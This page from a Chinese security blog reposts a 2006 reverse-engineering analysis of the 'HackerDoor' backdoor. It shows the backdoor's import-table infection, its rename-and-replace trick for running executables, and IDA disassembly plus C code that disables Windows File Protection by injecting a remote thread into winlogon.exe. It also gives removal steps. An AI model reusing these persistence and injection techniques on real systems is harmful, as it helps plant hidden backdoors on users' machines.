@@ -1,0 +1,865 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>黑客之门的魅力：感染与加载 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="黑客之门的魅力：感染与加载 最近对后门产生了很浓厚的兴趣，上网与各位高手讨论的时候，有人提到了“黑客之门”很厉害，也算是推出来的比较成功的一个后门，于是上网下载了一个研究研究，顺便也学习学习其中的方法与技巧。不敢独享，分享于此，同时希望高手们指教。" />
+<meta name="keywords" content="黑客之门的魅力：感染与加载" />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/1731/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="黑客之门的魅力：感染与加载" />
+<meta property="og:description" content="黑客之门的魅力：感染与加载 最近对后门产生了很浓厚的兴趣，上网与各位高手讨论的时候，有人提到了“黑客之门”很厉害，也算是推出来的比较成功的一个后门，于是上网下载了一个研究研究，顺便也学习学习其中的方法与技巧。不敢独享，分享于此，同时希望高手们指教。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/1731/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2011-08-30T00:27:00&#43;08:00" />
+<meta property="article:modified_time" content="2011-08-30T00:27:00&#43;08:00" />
+
+<meta itemprop="name" content="黑客之门的魅力：感染与加载">
+<meta itemprop="description" content="黑客之门的魅力：感染与加载 最近对后门产生了很浓厚的兴趣，上网与各位高手讨论的时候，有人提到了“黑客之门”很厉害，也算是推出来的比较成功的一个后门，于是上网下载了一个研究研究，顺便也学习学习其中的方法与技巧。不敢独享，分享于此，同时希望高手们指教。"><meta itemprop="datePublished" content="2011-08-30T00:27:00&#43;08:00" />
+<meta itemprop="dateModified" content="2011-08-30T00:27:00&#43;08:00" />
+<meta itemprop="wordCount" content="5520">
+<meta itemprop="keywords" content="黑客,bug,exe,Windows,保护,操作系统,测试,程序,代码,分析,工具,函数,后门,汇编,技巧,技术,文件,系统,注入," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="黑客之门的魅力：感染与加载"/>
+<meta name="twitter:description" content="黑客之门的魅力：感染与加载 最近对后门产生了很浓厚的兴趣，上网与各位高手讨论的时候，有人提到了“黑客之门”很厉害，也算是推出来的比较成功的一个后门，于是上网下载了一个研究研究，顺便也学习学习其中的方法与技巧。不敢独享，分享于此，同时希望高手们指教。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">黑客之门的魅力：感染与加载</h1>
+      
+      <div class="post-meta">
+        <time datetime="2011-08-30" class="post-time">
+          2011-08-30
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/%E9%BB%91%E5%AE%A2/"> 黑客 </a>
+            
+          </div>
+        <span class="more-meta"> 约 5520 字 </span>
+          <span class="more-meta"> 预计阅读 12 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+<P>2006/12/08 12:36 ，老文新翻。</P>
+<P>文章来源：风蓝志</P>
+<P>适合读者：黑器爱好者、入侵爱好者、编程爱好者</P>
+<P>前置知识：黑客之门的基本功能</P>
+<P>蝴蝶：学习黑客技术很关键的一点就在于不断地学习先进的技术，不断地创造出新的东西，这样才能在飞速发展的网络技术中占领自己的一席之地。最近大家关注的黑兵器有些什么呢？黑客之门估计是大多数人关注的目标，因为它太厉害了，厉害到它不但是个功能超强的后门，同时它还有很多思想都是比较新颖的，值得大家学习。正好本文作者通过自己写程序和分析黑客之门的代码获得了很大的提高，于是写下此文。抱着学习的态度从技术角度分析黑客程序的编制技巧，与大家分享，8错8 错！</P>
+<P>黑客之门的魅力：感染与加载</P>
+<P>最近对后门产生了很浓厚的兴趣，上网与各位高手讨论的时候，有人提到了“黑客之门”很厉害，也算是推出来的比较成功的一个后<SPAN id=more-765></SPAN>门，于是上网下载了一个研究研究，顺便也学习学习其中的方法与技巧。不敢独享，分享于此，同时希望高手们指教。</P>
+<P>“黑客之门”介绍</P>
+<P>黑客之门采用的目前一些先进的后门技术，它只有一个Dll文件，通过感染系统文件启动自身，被感染的系统文件大小和日期都不会改变；同时采用线程插入技术，本身没有进程；本身不开端口，而是重用系统进程开的任意一个端口，如80，135，139，445等，因此它的隐藏性非常好，而且穿透防火墙也是很容易的事。这个版本文件不大，只提供一些很有用的命令。目前还没有发现如何工具能查到这个后门，象Fport，Llister，RKDetector等查工具都失效。 <br />
+程序的自启动</P>
+<P>既然是一个后门，那么就要随系统的启动而启动，根据黑客之门的介绍，它是通过感染系统程序文件来实现程序的自启动的。既然是感染了系统文件（像病毒），那就看看感染前和感染后的系统文件的区别吧！为了测试感染前后的差别，我准备了一个专门用来被感染的文件TestLoad.exe，它没有什么功能，只是弹出一个对话框，这样好等待测试，麻雀虽小，五脏俱全，省得动系统文件了。接着运行命令：</P>
+<P>C:&gt;rundll32 hkdoordll，DllRegisterServer TestLoad.exe 2 <br />
+使黑客之门感染TestLoad.exe，感染完毕后用EXE文件查看利器eXescope查看TestLoad.exe被感染前后的差别。</P>
+<P>被感染之前eXescpoe显示的TestLoad.exe的结构如图1所示： <br />
+<IMG style="FILTER: ; WIDTH: 492px; HEIGHT: 654px" height=654 alt=黑客之门的魅力：感染与加载 hspace=0 src="/file/old/528_403f1bcd7afce53d0eb345c3.jpg" width=492 border=0> <br />
+图1 <br />
+感染之后的TestLoad.exe的结构如图2所示： <br />
+<IMG style="FILTER: ; WIDTH: 450px; HEIGHT: 654px" height=654 alt=黑客之门的魅力：感染与加载 hspace=0 src="/file/old/529_82f352c36f447139b219a8cc.jpg" width=450 border=0> <br />
+图2 <br />
+可以看出感染之后的TestLoad.exe的引入表多了一个Hkdoordll.dll引入库。细心观察感染之后的 TestLoad.exe的引入表地址（Import Table Address ITA）已经被改变，原来的ITA为0x000043FC，感染之后为0x0000477E。 <br />
+为了进一步看清除感染前后的文件的变化，这里使用LordPE.exe比较感染前后的TestLoad.exe的引入表函数，比较结果如图3所示： <br />
+<IMG style="FILTER: ; WIDTH: 450px; HEIGHT: 557px" height=557 alt=黑客之门的魅力：感染与加载 hspace=0 src="/file/old/530_3f550b0350f8d21b3812bbcc.jpg" width=450 border=0> <br />
+图3 <br />
+小提示：使用LordPE.exe查看exe文件的引入表函数方法是：点击PE Edito打开相应的文件，接着点击Directories，弹出对话框后点击Import Table右边的三个点，这样就可以查看一个可执行文件的引入表了。</P>
+<P>可以看出，只是在引入表链表中添加了一个相应的Hkdoordll.dll，这样当被感染的程序再次运行时，由系统的程序装载器搜索Hkdoordll.dll，并将其引用到被感染程序的地址空间，后门就运行起来了。黑客之门的这种子启动方式值得学习，比较灵巧。</P>
+<P>搞明白了黑客之门的启动方式后，我们就可以手动清除它了，这里切不可将Hkdoordll.dll直接删除，这样可能直接导致系统崩溃。因为系统在加载被感染的程序（假如为Services.exe）时发现没有找到Hkdoordll.dll，Services.exe将不能被装载，如果被感染的是系统关键进程的话，那么系统将不能正确的启动。清除的时候我们可以去别的机器上（相同系统与补丁）找一个Services.exe，将被感染的程序命名为 Services2.exe，将Services.exe拷贝到System32文件夹下，重启电脑，删除Hkdoordll.dll就清除黑客之门了。 <br />
+运行时感染</P>
+<P>上面说的是黑客之门的自启动方式，下面看看黑客之门是怎么感染正在运行的系统文件的，这一点让我晕了很久，最后发现是用了一个很灵活的小技巧。 <br />
+我们知道在Windows系统下，正在运行的程序文件一般是不能修改或者删除的，正是由于这一点，才出现了各种程序运行时的自删除大法，程序自删除不是我们这次的重点。但是，细心的用户可能已经发现，在Windows 2000或Wndows XP系统下，我们可以对正在运行的EXE文件进行重命名或者移动。 <br />
+再拿刚才的TestLoad.exe做测试，运行：</P>
+<P>C:&gt;rundll32 hkdoordll，DllRegisterServer TestLoad.exe 2 <br />
+可以发现TestLoad.exe所在的文件夹内多出了一个文件TestLoad.exe.bak，咋一看还以为“黑客之门”做好事，自动帮你备份一下系统文件，其实这可是黑客之门的狐狸尾巴啊！是它不得已而为之的。不要关闭TestLoad.exe，然后试着删除TestLoad.exe和 TestLoad.exe.bak，是不是发现奇迹了？竟然把TestLoad.exe删掉了，而TestLoad.exe.bak竟然不让删，是不是和我刚才说的话矛盾？非也！非也！刚好证明了刚才的话：黑客之门先把TestLoad.exe改名为TestLoad.exe.bak，然后生成一个被感染的TestLoad.exe，这样，下次运行TestLoad.exe实际上是被替换过的程序，原来的程序则放在一边。 <br />
+用IDA Pro反汇编Hkdoordll.dll可以发现以下函数的调用：</P>
+<P>文件重命名：</P>
+<P>.data:1000C618 lea ecx， [esp+438h+FileName] <br />
+.data:1000C61F lea edx， [esp+438h+var_324] <br />
+.data:1000C626 push ecx <br />
+.data:1000C627 push edx <br />
+.data:1000C628 call rename</P>
+<P>拷贝文件：</P>
+<P>.data:1000C66F lea edx， [esp+440h+var_32C] <br />
+.data:1000C676 push 0 ; bFailIfExists <br />
+.data:1000C678 lea eax， [esp+444h+var_228] <br />
+.data:1000C67F push edx ; lpNewFileName <br />
+.data:1000C680 push eax ; lpExistingFileName <br />
+.data:1000C681 call CopyFileA</P>
+<P>移动文件：</P>
+<P>.data:1000C795 mov eax， [ebp+8] <br />
+.data:1000C798 test eax， eax <br />
+.data:1000C79A jnz short loc_1000C7FE <br />
+.data:1000C79C lea ecx， [esp+448h+var_334] <br />
+.data:1000C7A3 push 5 ; dwFlags <br />
+.data:1000C7A5 lea edx， [esp+44Ch+var_230] <br />
+.data:1000C7AC push ecx ; lpNewFileName <br />
+.data:1000C7AD push edx ; lpExistingFileName <br />
+.data:1000C7AE call MoveFileExA <br />
+上面的语句实际上可以理解为: <br />
+MoveFileEx(“TestLoad.exe”，”TestLoad.exe.bak”， MOVEFILE_DELAY_UNTIL_REBOOT| MOVEFILE_REPLACE_EXISTING);</P>
+<P>小知识：MSDN中对MoveFileEx()函数的解释为： <br />
+BOOL MoveFileEx( <br />
+LPCTSTR lpExistingFileName， // pointer to the name of the existing file <br />
+LPCTSTR lpNewFileName， // pointer to the new name for the file <br />
+DWORD dwFlags // flag that specifies how to move file <br />
+);</P>
+<P>这样进程TestLoad.exe的文件映象实际上为TestLoad.exe.bak，接着Hkdoordll.dll生成被感染的TestLoad.exe，并且保存在原来的文件路径上即可。</P>
+<P>灭掉系统文件保护</P>
+<P>一旦系统启动了，Windows系统就开始加载已经被感染的系统程序，但是由于“黑客之门”是通过感染系统程序实现自启动的，这下子又遇到了另外一个问题。</P>
+<P>大家都知道，在Windows 2000和Windows XP中有系统文件保护功能，一旦被保护的系统文件被修改了，就会弹出需要插入系统安装盘CD的对话框。这样就导致了一个问题， TestLoad.exe只是一个普通的EXE文件，而不是受系统文件保护系统保护的系统进程，那为什么黑客之门修改系统进程时，操作系统的文件的文件保护系统不会提醒呢？ <br />
+这一点，还是采用反汇编黑客之门的方法，观察它是怎样关闭系统文件保护功能的。</P>
+<P>发现如下的代码：</P>
+<P>.data:1000BBB0 LoadSFCDLL proc near ; CODE XREF: sub_1000BC70+B7 <br />
+.data:1000BBB0 push esi <br />
+.data:1000BBB1 xor esi， esi <br />
+.data:1000BBB3 call GetVersion ; Get current version number of Windows <br />
+.data:1000BBB3 ; and information about the operating system platform <br />
+.data:1000BBB9 cmp al， 5 <br />
+.data:1000BBBB jnz short loc_1000BBDF <br />
+.data:1000BBBD xor ecx， ecx ;此时为Windows2000系统 <br />
+.data:1000BBBF mov cl， ah <br />
+.data:1000BBC1 test cl， cl <br />
+.data:1000BBC3 jnz short loc_1000BBD2 <br />
+.data:1000BBC5 push offset aSfc_dll ; lpLibFileName <br />
+.data:1000BBCA call LoadLibraryA ;此时为WindowsXP系统 <br />
+.data:1000BBD0 pop esi <br />
+.data:1000BBD1 retn <br />
+.data:1000BBD2 loc_1000BBD2: ; CODE XREF: LoadSFCDLL+13 j <br />
+.data:1000BBD2 push offset aSfc_os_dll ; lpLibFileName <br />
+.data:1000BBD7 call LoadLibraryA <br />
+.data:1000BBDD pop esi <br />
+.data:1000BBDE retn</P>
+<P>上面的代码可以看出，Hkdoordll.dll根据操作系统的版本调用了Sfc.dll或者Sfc_os.dll，如果是Windows 2000（Windows NT 5.0）的话，装载Sfc.dll；如果是Windows XP（Windows NT 5.1）的话，装载Sfc_os.dll。再看下面的一段反汇编代码：</P>
+<P>sub esp， 228h <br />
+.data:1000BC76 lea eax， [esp+228h+hObject] <br />
+.data:1000BC7A push ebx <br />
+.data:1000BC7B push esi <br />
+.data:1000BC7C push edi <br />
+.data:1000BC7D push offset aWinlogon_exe ; "winlogon.exe" <br />
+.data:1000BC82 push 0 <br />
+.data:1000BC84 push offset aDS ; "%d/%s" <br />
+.data:1000BC89 push 1Fh <br />
+.data:1000BC8B mov edi， ecx <br />
+.data:1000BC8D push eax <br />
+.data:1000BC8E call sub_10008C60 <br />
+.data:1000BC93 add esp， 14h <br />
+.data:1000BC96 lea ecx， [esp+234h+hObject] <br />
+.data:1000BC9A push ecx ; lpMultiByteStr <br />
+.data:1000BC9B call sub_100016CC //这个子函数就是用来得到进程ID <br />
+.data:1000BCA0 cmp eax， 0FFFFFFFDhSFC <br />
+.data:1000BCA3 jb short loc_1000BCDB <br />
+.data:1000BCA5 push offset aCanTGetWinlogo ; "Can't get winlogon process id!rn"</P>
+<P>上面的函数用来得到Winlogon.exe进程的ID，以便下面打开它注入代码：</P>
+<P>.data:1000BCDB push eax ; dwProcessId <br />
+.data:1000BCDC push 0 ; bInheritHandle <br />
+.data:1000BCDE push 1F0FFFh ; dwDesiredAccess <br />
+.data:1000BCE3 call OpenProcess ;打开目标进程 <br />
+.data:1000BCE9 mov ebx， eax <br />
+.data:1000BCEB test ebx， ebx <br />
+.data:1000BCED jnz short loc_1000BD25</P>
+<P>上面的汇编代码段是调用OpenProcess()函数打开Winlogon.exe进程。继续观察反汇编代码，发现下面的一段：</P>
+<P>.data:1000BD25 mov ecx， edi <br />
+.data:1000BD27 call LoadSFCDLL <br />
+.data:1000BD2C mov esi， eax <br />
+.data:1000BD2E test esi， esi <br />
+.data:1000BD30 jnz short loc_1000BD6F <br />
+.data:1000BD6F push 2 ;函数序号为2 <br />
+.data:1000BD71 push esi ;SFC.dll的 hModule <br />
+.data:1000BD72 call GetProcAddress ;得到SFC.dll中序数为2 的函数的地址 <br />
+.data:1000BD78 test eax， eax <br />
+.data:1000BD7A mov [edi+10h]， eax <br />
+.data:1000BD7D jnz short loc_1000BDC3</P>
+<P>可以发现上面的汇编代码用来得到以前装载的Sfc.dll（或Sfc_os.dll）中的序数为2的函数的地址。接着程序跳转到了Loc_1000BDC3，继续跟踪反汇编代码，发现以下一段：</P>
+<P>.data:1000BDC3 push eax ; 刚才得到的SFC.dll中函数的地址 <br />
+.data:1000BDC4 push ebx ; Winlogon.exe进程的句柄 <br />
+.data:1000BDC5 mov ecx， edi <br />
+.data:1000BDC7 call sub_1000BBF0?注意这里调用函数 sub_1000BBF0 <br />
+.data:1000BDCC push esi ; hLibModule <br />
+.data:1000BDCD mov edi， eax <br />
+.data:1000BDCF call FreeLibrary <br />
+.data:1000BDD5 test edi， edi <br />
+.data:1000BDD7 push ebx ; hObject <br />
+跟进Sub_1000BBF0函数，Sub_1000BBF0函数： <br />
+入口参数：进程句柄、线程开始地址 <br />
+.data:1000BBF0 sub_1000BBF0 proc near ; CODE XREF: sub_1000BC70+157 p <br />
+.data:1000BBF0 <br />
+.data:1000BBF0 ThreadId = dword ptr -1 <br />
+.data:1000BBF0 hProcess = dword ptr 7 <br />
+.data:1000BBF0 lpStartAddress = dword ptr 0Bh <br />
+.data:1000BBF0 <br />
+.data:1000BBF0 push ecx <br />
+.data:1000BBF1 mov ecx， [esp+1+lpStartAddress] <br />
+.data:1000BBF5 mov edx， [esp+1+hProcess] <br />
+.data:1000BBF9 lea eax， [esp+1+ThreadId] <br />
+.data:1000BBFD push esi <br />
+.data:1000BBFE push eax ; lpThreadId <br />
+.data:1000BBFF push 0 ; dwCreationFlags <br />
+.data:1000BC01 push 0 ; lpParameter <br />
+.data:1000BC03 push ecx ; SFC.dll中第二个函数的函数地址 <br />
+.data:1000BC04 push 0 ; dwStackSize <br />
+.data:1000BC06 push 0 ; lpThreadAttributes <br />
+.data:1000BC08 push edx ; 以前打开的winlogon.exe进程的句柄 <br />
+.data:1000BC09 mov [esp+21h+ThreadId]， 0 <br />
+.data:1000BC11 call CreateRemoteThread ;创建远线程 <br />
+.data:1000BC17 mov esi， eax <br />
+.data:1000BC19 test esi， esi ;ESI保存刚才新创建的线程的句柄 <br />
+.data:1000BC1B jnz short loc_1000BC3F <br />
+―――――――――――――――――――――――――――――― <br />
+.data:1000BC3F <br />
+.data:1000BC3F loc_1000BC3F: ; CODE XREF: sub_1000BBF0+2B j <br />
+.data:1000BC3F push 0FA0h ; dwMilliseconds <br />
+.data:1000BC44 push esi ; 新创建的线程的句柄 <br />
+.data:1000BC45 call WaitForSingleObject ;等待远程线程的结束 <br />
+.data:1000BC4B test eax， eax <br />
+.data:1000BC4D jz short loc_1000BC5D <br />
+―――――――――――――――――――――――――――――――――― <br />
+.data:1000BC5D <br />
+.data:1000BC5D loc_1000BC5D: ; CODE XREF: sub_1000BBF0+5D j <br />
+.data:1000BC5D push esi ; hObject <br />
+.data:1000BC5E call CloseHandle <br />
+.data:1000BC64 mov eax， [esp+5+ThreadId] <br />
+.data:1000BC68 pop esi <br />
+.data:1000BC69 pop ecx <br />
+.data:1000BC6A retn 8 <br />
+.data:1000BC6A sub_1000BBF0 endp</P>
+<P>上面的子函数功能很简单，就是在刚刚打开的Winlogon.exe进程中创建新的线程，新线程调用SFC.dll中的序号为2的输出函数，这样便关掉了系统文件的自我保护。</P>
+<P>事实上，根据Bgate的《在Win 2000/XP上安静地替换正在使用的系统文件》这篇文章的解释，在Windows 2000(XP)系统下，执行系统文件保护的代码在Sfc.dll（XP在Sfc_os.dll）中，这个Dll由Winlogon.exe调用。 Winlogon.exe主要调用Sfc.dll中的两个函数实现系统文件文件保护。Winlogon.exe调用Sfc.dll中的一个输出函数在系统启动的时候创建了一系列事件，Winlogon.exe结束时调用另外一个函数关闭上面的一系列事件，这样就关闭了系统保护文件功能。那这样我们只需要向 Winlogon.exe中注入代码调用“第二个”函数，就能取消文件保护功能了，“黑客之门”采用的也正是这样的方法。</P>
+<P>这里需要注意的是，要把进程注入到Winlogon.exe中，需要提升自身的权限到Debug权限。</P>
+<P>HANDLE hToken; <br />
+LUID DebugNameValue; <br />
+TOKEN_PRIVILEGES Privileges; <br />
+DWORD dwRet;</P>
+<P>OpenProcessToken(GetCurrentProcess()， <br />
+TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY，hToken); <br />
+LookupPrivilegeValue(NULL，"SeDebugPrivilege"，&amp;DebugNameValue); <br />
+Privileges.PrivilegeCount=1; <br />
+Privileges.Privileges[0].Luid=DebugNameValue; <br />
+Privileges.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED; <br />
+AdjustTokenPrivileges(hToken，FALSE，&amp;Privileges，sizeof(Privileges)， <br />
+NULL，&amp;dwRet); <br />
+CloseHandle(hToken);</P>
+<P>上面整个关闭系统文件保护功能的实现用C语言写下来如下所示：</P>
+<P>/*得到进程的ID，具体的方法可以使用CreateToolHelpSnap32()，ProcessFirst32()以及ProcessNext32()得到*/ <br />
+DWORD dwPid=GetProcessIdFromName(“Winlogon.exe”); <br />
+HANDLE Process=OpenProcess(，FALSE，dwPid); <br />
+DWORD dwVersion; <br />
+HMODULE hSfc; <br />
+dwVersion = GetVersion(); <br />
+//判断操作系统的类型 <br />
+if ((DWORD)(LOBYTE(LOWORD(dwVersion))) == 5) <br />
+{ // Windows 2000/XP <br />
+if((DWORD)(HIBYTE(LOWORD(dwVersion))) == 0) //Windows 2000 <br />
+hSfc = LoadLibrary("sfc.dll");  <br />
+else if((DWORD)(HIBYTE(LOWORD(dwVersion))) = 1) //Windows XP <br />
+hSfc = LoadLibrary("sfc_os.dll");  <br />
+}  <br />
+//得到函数的地址 <br />
+FARPROC dwAddress=GerProcAddress(hSfc， MAKEINTRESOURCE(2)); <br />
+DWORD dwThreadId; <br />
+HANDLE hThread; <br />
+//创建远线程 <br />
+hThread =CreateRemoteThread(hProcess，0，0， / <br />
+(DWORD (__stdcall *) (void *)) dwAddress，0，0，&amp;dwThreadId); <br />
+WaitForSingleObject(hThread，0x0FA0);</P>
+<P>结束语</P>
+<P>大概分析完了，刚开始拿到黑客之门的时候，还在想，它到底是怎样感染正在运行的系统文件的呢？原来以为是修改进程的句柄指向的进程的操作掩码完成的，为此我还翻阅了好多文档。结果通过对程序的反汇编学习，渐渐的发现黑客之门的程序编制的技巧。这里也要感谢“黑客之门”的作者，没有给它加壳，能让我们有幸能一睹优秀黑客工具的容颜！ <br />
+不到之处，欢迎指教，Mail：fengcaho@163.com。 <br />
+（文中涉及程序已收录到杂志配套光盘“杂志相关”栏目，按文章名查找即可）</P>
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2011-08-30
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/%E9%BB%91%E5%AE%A2/">黑客</a>
+          <a href="https://lcx.cc/tags/bug/">bug</a>
+          <a href="https://lcx.cc/tags/exe/">exe</a>
+          <a href="https://lcx.cc/tags/windows/">Windows</a>
+          <a href="https://lcx.cc/tags/%E4%BF%9D%E6%8A%A4/">保护</a>
+          <a href="https://lcx.cc/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+          <a href="https://lcx.cc/tags/%E6%B5%8B%E8%AF%95/">测试</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E5%88%86%E6%9E%90/">分析</a>
+          <a href="https://lcx.cc/tags/%E5%B7%A5%E5%85%B7/">工具</a>
+          <a href="https://lcx.cc/tags/%E5%87%BD%E6%95%B0/">函数</a>
+          <a href="https://lcx.cc/tags/%E5%90%8E%E9%97%A8/">后门</a>
+          <a href="https://lcx.cc/tags/%E6%B1%87%E7%BC%96/">汇编</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E5%B7%A7/">技巧</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/1732/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
